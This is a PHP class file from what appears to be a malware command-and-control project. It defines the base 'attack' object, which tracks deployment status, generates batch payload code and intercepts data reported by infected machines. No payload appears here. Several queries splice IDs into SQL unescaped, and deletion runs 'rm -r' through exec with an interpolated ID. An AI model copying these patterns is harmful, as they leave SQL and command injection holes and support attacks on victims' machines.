<?php /** @noinspection PhpIncludeInspection */

/** @noinspection PhpUndefinedMethodInspection */

namespace Kelvinho\Virus\Attack;

use Kelvinho\Virus\Logs;
use Kelvinho\Virus\Network\RequestData;
use Kelvinho\Virus\Session;
use Kelvinho\Virus\Virus\VirusFactory;
use function Kelvinho\Virus\db;

/**
 * Class AttackInterface
 * @package Kelvinho\Virus\Attack
 *
 * Represents an attack. The representation of this will be stored in table attacks, and the data stored on disk is at:
 * DATA_FILE/attacks/{attack_id}/
 *
 * Currently, these are stored on disk:
 * - Profile text, at /profile.txt
 * - Additional info, at /state.json, utilized by subclasses
 */
abstract class AttackInterface {
    public const STATUS_DORMANT = "Dormant";
    public const STATUS_EXECUTED = "Executed";
    public const STATUS_DEPLOYED = "Deployed";
    public const STATUSES = [self::STATUS_DORMANT, self::STATUS_DEPLOYED, self::STATUS_EXECUTED];
    protected string $attack_id;
    protected string $packageDbName; // this is read-only. After an attack is initialized, you can't change its package.
    protected string $status = self::STATUS_DORMANT;
    protected string $virus_id;
    protected string $name = "";
    protected string $profile = "";
    protected int $executed_time = 0;
    protected RequestData $requestData;
    protected Session $session;
    protected VirusFactory $virusFactory;
    protected AttackFactory $attackFactory;

    function __construct() {
    }

    /** @noinspection PhpUnused */
    function setContext(RequestData $requestData, Session $session, VirusFactory $virusFactory, AttackFactory $attackFactory) {
        $this->requestData = $requestData;
        $this->session = $session;
        $this->virusFactory = $virusFactory;
        $this->attackFactory = $attackFactory;
    }

    /** @noinspection PhpUnused */
    function setAttackId(string $attack_id): void {
        $this->attack_id = $attack_id;
    }

    public function getAttackId(): string {
        return $this->attack_id;
    }

    /** @noinspection PhpUnused */
    public function setStatus(string $status): void {
        $this->status = $status;
    }

    public function getStatus(): string {
        return $this->status;
    }

    public function isStatus(string $status): bool {
        return $status == $this->status;
    }

    public function setName(string $name): void {
        $this->name = $name;
    }

    public function getName(): string {
        return $this->name;
    }

    public function setProfile(string $profile): void {
        $this->profile = $profile;
    }

    public function getProfile(): string {
        return $this->profile;
    }

    /** @noinspection PhpUnused */
    function setPackageDbName(string $packageDbName): void {
        $this->packageDbName = $packageDbName;
    }

    public function getPackageDbName(): string {
        return $this->packageDbName;
    }

    public function getVirusId(): string {
        return $this->virus_id;
    }

    /** @noinspection PhpUnused */
    function setVirusId(string $virus_id): void {
        $this->virus_id = $virus_id;
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    public function generateIntercept(): string {
        return "";
    }

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    abstract protected function setState(string $json): void;

    /**
     * This will load the state of this attack using the file /data/attacks/{attack_id}/state.json. Also loads from database.
     * Storing information in 2 places may seem inconvenient and makes you question "Why?", but some common denominator of
     * attacks should be placed in the database.
     * @param string|null $attack_id Optional attack id. This is used for making sure the attack representation is created okay when initializing
     * @noinspection PhpUnused
     */
    public function loadState(string $attack_id = null): void {
        if ($attack_id == null) {
            $attack_id = $this->attack_id;
        }
        $this->setState(file_get_contents(DATA_FILE . "/attacks/$attack_id/state.json"));
        $this->setProfile(file_get_contents(DATA_FILE . "/attacks/$attack_id/profile.txt"));
        /*
        $mysqli = db();
        if ($mysqli->connect_errno) {
            Logs::logMysql($mysqli->connect_error);
        }
        $answer = $mysqli->query("select name, attack_package, virus_id, status, executed_time from attacks where attack_id = \"$attack_id\"")->fetch_assoc();
        $this->packageDbName = $answer["attack_package"];
        if (!in_array($answer["status"], self::STATUSES)) {
            trigger_error("Status can't have value " . $answer["status"] . "!");
        }
        $this->status = $answer["status"];
        $this->virus_id = $answer["virus_id"];
        $this->name = $answer["name"];
        $this->executed_time = $answer["executed_time"];
        $mysqli->close();/**/
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    abstract protected function getState(): string;

    /**
     * This will save the state of this attack using the file /data/attacks/{attack_id}/state.json. Also saves to database.
     *
     * @param string|null $attack_id Optional attack id. This is used for making sure the attack representation is created okay when initializing
     */
    public function saveState(string $attack_id = null): void {
        if ($attack_id == null) {
            $attack_id = $this->attack_id;
        }
        file_put_contents(DATA_FILE . "/attacks/$attack_id/state.json", $this->getState());
        file_put_contents(DATA_FILE . "/attacks/$attack_id/profile.txt", $this->getProfile());
        $mysqli = db();
        if ($mysqli->connect_errno) Logs::mysql($mysqli->connect_error);
        $mysqli->query("update attacks set status = \"$this->status\", name = \"" . $mysqli->escape_string($this->name) . "\", status = \"$this->status\", executed_time = $this->executed_time where attack_id = \"$attack_id\"");
        $mysqli->close();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    abstract public function generateBatchCode(): string;

    /**
     * This will include some extra resources that the attack might need. Things like other scripts and configs.
     *
     * @param string $resource The resource name
     */
    abstract public function processExtras(string $resource): void;

    public function render(): void {
        Renderer::render(PackageRegistrar::getLocation($this->packageDbName), $this->session, $this->attackFactory);
    }

    /**
     * This will include the correct controller page for this particular attack type.
     */
    public function includeController(): void {
        include(PackageRegistrar::getLocation($this->packageDbName) . "/controller.php");
    }

    /**
     * This will include the correct intercept script
     */
    public function includeIntercept(): void {
        include(PackageRegistrar::getLocation($this->packageDbName) . "/intercept.php");
    }

    /**
     * Deploys the attack.
     */
    public function deploy(): void {
        $this->status = self::STATUS_DEPLOYED;
    }

    /**
     * Cancels the attack.
     */
    public function cancel(): void {
        $this->status = self::STATUS_DORMANT;
    }

    /**
     * Sets this attack to be executed.
     */
    public function setExecuted(): void {
        $this->status = self::STATUS_EXECUTED;
        $this->executed_time = time();
    }

    /**
     * Return the executed time. Is 0 if this attack has not been executed.
     *
     * @return int The unix timestamp
     */
    public function getExecutedTime(): int {
        return $this->executed_time;
    }

    /** @noinspection PhpUnused */
    function setExecutedTime(int $executedTime): void {
        $this->executed_time = $executedTime;
    }

    /**
     * Deletes permanently the attack.
     */
    public function delete(): void {
        $mysqli = db();
        if ($mysqli->connect_errno) {
            Logs::mysql($mysqli->connect_error);
        }
        $mysqli->query("delete from attacks where attack_id = \"$this->attack_id\"");
        $mysqli->close();
        exec("rm -r " . DATA_FILE . "/attacks/$this->attack_id");
    }

    /**
     * Checks whether an attack id exists or not.
     *
     * @param string $attack_id The attack id
     * @return bool Whether it exists or not
     */
    public static function exists(string $attack_id): bool {
        $mysqli = db();
        if ($mysqli->connect_errno) {
            Logs::mysql($mysqli->connect_error);
        }
        $answer = $mysqli->query("select attack_id from attacks where attack_id = \"" . $mysqli->escape_string($attack_id) . "\"");
        $mysqli->close();
        if ($answer) {
            $row = $answer->fetch_assoc();
            if ($row) {
                return true;
            }
        }
        return false;
    }
}